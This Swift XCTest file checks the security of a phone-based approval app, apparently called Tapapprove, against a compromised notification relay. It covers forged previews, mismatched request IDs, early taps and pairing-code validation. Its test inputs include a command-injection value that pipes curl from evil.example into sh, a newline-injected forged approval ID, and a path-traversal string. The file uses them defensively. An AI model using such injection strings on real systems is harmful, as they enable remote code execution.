import UserNotifications
import XCTest
@testable import Tapapprove

/// The checks that stand between a hacked relay and an approval the person never gave. The relay
/// writes every push and chooses every field of it, so these tests play that relay.
final class SecurityChecksTests: XCTestCase {
    private let keys = ChannelKeys(
        requestKey: Data(repeating: 1, count: 32),
        answerKey: Data(repeating: 2, count: 32),
        proofKey: Data(repeating: 3, count: 32)
    )
    private let requestID = "3f2a6c1e-8b7d-4e21-9c0f-5a6b7c8d9e0f"
    private let otherID = "aaaaaaaa-8b7d-4e21-9c0f-5a6b7c8d9e0f"

    private func sealedPreview(
        for id: String? = nil,
        title: String = "Run command",
        body: String = "ls -la",
        category: String = SealedPreview.quickCategory
    ) throws -> String {
        let json = #"{"title":"\#(title)","subtitle":"shop","body":"\#(body)","category":"\#(category)"}"#
        return try ChannelCrypto.seal(json, key: keys.requestKey, label: "preview:\(id ?? requestID)")
    }

    private func notification(
        title: String = "Run command",
        subtitle: String = "shop",
        body: String = "ls -la",
        category: String = SealedPreview.quickCategory,
        requestID: String? = nil,
        preview: String?
    ) -> UNNotificationContent {
        let content = UNMutableNotificationContent()
        content.title = title
        content.subtitle = subtitle
        content.body = body
        content.categoryIdentifier = category
        content.userInfo = ["requestId": requestID ?? self.requestID]
        if let preview { content.userInfo["preview"] = preview }
        return content
    }

    private func resolve(_ action: String, _ content: UNNotificationContent, shownFor: TimeInterval = 5) -> NotificationAnswer {
        NotificationAnswer.resolve(action: action, content: content, keys: keys, shownFor: shownFor)
    }

    // MARK: - Answering from a notification

    func testYesOnWhatTheComputerSealedIsSent() throws {
        let content = notification(preview: try sealedPreview())
        XCTAssertEqual(
            resolve(NotificationAnswer.approveAction, content),
            .send(requestID: requestID, Answer(decision: .allow))
        )
    }

    func testSessionAnswerOnWhatTheComputerSealedIsSent() throws {
        let category = SealedPreview.quickSessionCategory
        let content = notification(category: category, preview: try sealedPreview(category: category))
        XCTAssertEqual(
            resolve(NotificationAnswer.sessionAction, content),
            .send(requestID: requestID, Answer(decision: .allow, option: 0))
        )
    }

    func testYesWithNoPreviewIsRefused() {
        let content = notification(body: "git status", preview: nil)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, content), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.sessionAction, content), .refuse)
    }

    func testYesOnTextTheRelayWroteBesideARealPreviewIsRefused() throws {
        // The real request is "ls -la" here, so this is what a harmless-looking lie looks like
        // when the relay keeps the real preview in the push to get past the opening check.
        let preview = try sealedPreview()
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, notification(body: "git status", preview: preview)), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, notification(title: "Fake", preview: preview)), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, notification(subtitle: "fake", preview: preview)), .refuse)
    }

    func testYesThatPointsAtAnotherRequestIsRefused() throws {
        let content = notification(requestID: otherID, preview: try sealedPreview())
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, content), .refuse)
    }

    func testAPreviewThatDoesNotOpenIsRefused() throws {
        let sealedForOtherKey = try ChannelCrypto.seal(
            #"{"title":"Run command","subtitle":"shop","body":"ls -la","category":"TAPAPPROVE_QUICK"}"#,
            key: keys.answerKey,
            label: "preview:\(requestID)"
        )
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, notification(preview: sealedForOtherKey)), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, notification(preview: "AAAA")), .refuse)
    }

    func testButtonsTheComputerDidNotOfferAreRefused() throws {
        // The computer said this request must be opened and read.
        let mustOpen = try sealedPreview(category: SealedPreview.reviewCategory)
        let dressedUp = notification(category: SealedPreview.quickCategory, preview: mustOpen)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, dressedUp), .refuse)
        let stillMustOpen = notification(category: SealedPreview.reviewCategory, preview: mustOpen)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, stillMustOpen), .refuse)

        // The computer offered no session answer here.
        let plain = try sealedPreview()
        let upgraded = notification(category: SealedPreview.quickSessionCategory, preview: plain)
        XCTAssertEqual(resolve(NotificationAnswer.sessionAction, upgraded), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.sessionAction, notification(preview: plain)), .refuse)
    }

    func testYesWithoutKeysIsRefused() throws {
        let content = notification(preview: try sealedPreview())
        XCTAssertEqual(NotificationAnswer.resolve(action: NotificationAnswer.approveAction, content: content, keys: nil, shownFor: 5), .refuse)
    }

    func testAYesTheMomentANotificationAppearsIsRefused() throws {
        // A hacked relay could replace a notification just as a finger comes down on it.
        let content = notification(preview: try sealedPreview())
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, content, shownFor: 0.1), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.sessionAction, content, shownFor: 0.1), .refuse)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, content, shownFor: -1), .refuse)
        XCTAssertEqual(
            resolve(NotificationAnswer.denyAction, content, shownFor: 0.1),
            .send(requestID: requestID, Answer(decision: .deny))
        )
    }

    func testNoStillWorksOnTheGenericNotification() {
        let content = notification(title: "Tapapprove", subtitle: "", body: "A request is waiting.", preview: nil)
        XCTAssertEqual(resolve(NotificationAnswer.denyAction, content), .send(requestID: requestID, Answer(decision: .deny)))
    }

    func testAnIDThatCouldForgeAProofIsNeverAnswered() throws {
        let planted = "\(requestID)\nallow\n0\n"
        let content = notification(requestID: planted, preview: nil)
        XCTAssertEqual(resolve(NotificationAnswer.denyAction, content), .nothing)
        XCTAssertEqual(resolve(NotificationAnswer.approveAction, content), .refuse)
    }

    func testOtherActionsSendNothing() throws {
        let content = notification(preview: try sealedPreview())
        XCTAssertEqual(resolve(NotificationAnswer.reviewAction, content), .nothing)
        XCTAssertEqual(resolve(UNNotificationDefaultActionIdentifier, content), .nothing)
        XCTAssertEqual(resolve(UNNotificationDismissActionIdentifier, content), .nothing)
    }

    // MARK: - Request IDs

    func testOnlyARealRequestIDPasses() {
        XCTAssertTrue(ChannelCrypto.isRequestID(requestID))
        for id in ["", "R", requestID.uppercased(), "\(requestID)\n", "\n\(requestID)", "\(requestID)\nallow\n0\n", "../\(requestID)"] {
            XCTAssertFalse(ChannelCrypto.isRequestID(id), id)
        }
    }

    // MARK: - Pairing

    private func start(_ code: String, expiresIn: Double = 600) -> PairingStart {
        PairingStart(code: code, watchToken: "token", expiresIn: expiresIn)
    }

    func testAGoodPairingStartPasses() {
        XCTAssertTrue(start("ABCD").isWellFormed)
        XCTAssertTrue(start("Z289", expiresIn: 1).isWellFormed)
    }

    func testARelayCannotWriteIntoThePairingCommand() {
        for code in ["", "ABC", "ABCDE", "abcd", "AB0D", "ABOD", "AB1D", "ABID", "AAAABBBBCCCC --name=", "AB D", "AB\nD", "ABCD; curl evil.example|sh"] {
            XCTAssertFalse(start(code).isWellFormed, code)
        }
    }

    func testARelayCannotKeepACodeOnScreenForLong() {
        for expiresIn in [0, -1, 601, 86_400, .infinity, .nan] {
            XCTAssertFalse(start("ABCD", expiresIn: expiresIn).isWellFormed, "\(expiresIn)")
        }
    }

    func testTheSecretIsEightyBitsAndTheCodeReadsInFours() {
        let secret = ChannelCrypto.randomSecret()
        XCTAssertEqual(secret.count, 16)
        XCTAssertNotEqual(secret, ChannelCrypto.randomSecret())
        XCTAssertEqual(
            ChannelCrypto.pairingCode(lookup: "ABCD", secret: "EFGHJKLMNPQRSTUV"),
            "ABCD-EFGH-JKLM-NPQR-STUV"
        )
    }

    // MARK: - Agreeing with the computer. These values were made by cli/lib, so this breaks if the two drift.

    private let computerRequestID = "a9d2cc01-f946-4b2e-9304-78b161201112"
    private let computerPreview = "ba+fMYdHJldS6E1ogZ9h5ipV7dsowpu0jd1DNPekrv075h1yhhRuqNTKLhpPj86cymi9nhj6ho2F6cvW2FoCYr3xGhnCIMk8y8pg4IY47CujQrWCUgK5UdXXSQj2Q1l186FgsThlOwqkuidV0N8YtfPrBCYx6NLW6sd/co4FKNAGWJiLC2xrGDzj59ZpXYb/mWFKAxS6dDCJVaQYTMCuw+R1QoFdACm5som5eUgulQ/GxvfzTqzymRi8U7jlYw8tYf69JrF9yJUUsATiNz2pdrDOsFAZxOAvwbBbFmy1QpMX4msCGj8rHs1ItbyLExWnaYjmJYrrvfAr5CsePzqU7tJrQUmu02OX8zePme0+ye9nRu91fEyu9TV0LZijHdioUkzrC4ur4BXh8jfjkfSaUDfAHZ+rntJSZ8rrvYdzuPr74/EIDpyVsZSshLbQNGaxd6XwTBTcjyR80HwMLRfiitSSv3oLzdROkk9Cj8NMElekJX1jMFJhgEBypkHixHUU6ZONcCQYY+AkHk+1uG5FpXSGx5jLGmTGfetATcYBdnhW6VnaQfs51BpOQAtwtHr9xBoa9gGMljbLYyU/xvWvfUMrz7QZmaEZ2GPguGPnVpNC7UoxOWuknMyFQSPEHjI6PRX0s4LZtwpe6aHph3fJ26Xgb0/y+TnfD08K2Y3KY8SrnvB3gO2KbOK3DYjbHCNG567OVM98478IlAOIxR1tlZ+tH3OyRP4Xch9YaAh4+JEBPn9xqsL+m+cOMp2jPMFz/jlPKucv+7gtlI1FTNPA2CCMMTPSYw8fGUTc5u0Luse+L7+VNRtTwSBEcCwblLs7Yn2sbrdCfwGb31TW2zPjUeASy87mUQYFxpDrRV7wJk3ZVPuLIBgIQJelwePVzsYW9igNJSNIHZNerChtGVzodSNm8dNTnTyYtqi8o9Xf/LxDwmqQP28XLD12xnXpq/6HPLB+qwtdM7TCJH4vk/38Esg9Jp3OwafTfHUnRGH7DWf917Zfx4TSznrn5tEGt7C8PNF+Eb4aUntUFYLOHZn7Bc6zYbHk+x8ONKtD9lLIpNIyfnnvgPRmTQGr5ykDgizwMDiDrNMg5SyCPku6dSkNlhjgAkKtUNYjC4QgEwi4D89WmU4z1MAnfJenaQCdd0QyI9yRF2K7mq6l9GTfqAQNQpiLmjd/XPL2a8x6ABOlGQiY5G3WtEAWAtBfgNZ1Q77LMO37NcGhS1aYxz2w2cuDFO/hO6eqUZv35/vNxR3FsaRJfeLylpr5vC588Bg7NPGfWjAvhEDxAZjUq+kbDSebB77kbL9omGfaTT1RfQDhx7k0YLrV51sj4l67eu/clP4sf8JCB2jseIsSOma9VQEPq3O6OIZYe54zmtnm1Gc0HpIY51zumdEra/QHfVE="

    func testAPaddedPreviewFromTheComputerOpens() throws {
        let preview = try XCTUnwrap(
            SealedPreview.open(userInfo: ["requestId": computerRequestID, "preview": computerPreview], keys: keys)
        )
        XCTAssertEqual(preview.title, "Run command")
        XCTAssertEqual(preview.subtitle, "shop")
        XCTAssertEqual(preview.body, "ls -la\n\nYes, allow ls for this session")
        XCTAssertEqual(preview.category, SealedPreview.quickSessionCategory)
    }

    func testProofsMatchTheComputer() {
        XCTAssertEqual(
            ChannelCrypto.proof(proofKey: keys.proofKey, requestID: computerRequestID, decision: .allow, option: 0, sealedMessage: nil),
            "9ZEDnGR0UlPTYmDYM6eqsvieg7Yg4nuhdLUEvghcP7E="
        )
        XCTAssertEqual(
            ChannelCrypto.proof(proofKey: keys.proofKey, requestID: computerRequestID, decision: .deny, option: nil, sealedMessage: "c2VhbGVk"),
            "4ZaP0T8u5vkdvcKXgRFQ2Va29mnneCNO+gHeb53iGWU="
        )
    }

    func testTheTagKeyMatchesTheComputer() throws {
        XCTAssertEqual(try ChannelCrypto.tagKey(secret: "EFGHJKLMNPQRSTUV").base64EncodedString(), "VI2pm17CY0WeY29fpgUb1OCdLbA9grDntrFE2C7z4Cc=")
    }

    func testPaddingMakesMessagesTheSameSizeAndTrimsAway() {
        let short = ChannelCrypto.padded(message: "use pnpm")
        XCTAssertEqual(short.utf8.count, 256)
        XCTAssertEqual(ChannelCrypto.padded(message: "use yarn instead please").utf8.count, 256)
        XCTAssertEqual(short.trimmingCharacters(in: .whitespaces), "use pnpm")
        XCTAssertEqual(ChannelCrypto.padded(message: String(repeating: "é", count: 128)).utf8.count, 256)
    }
}
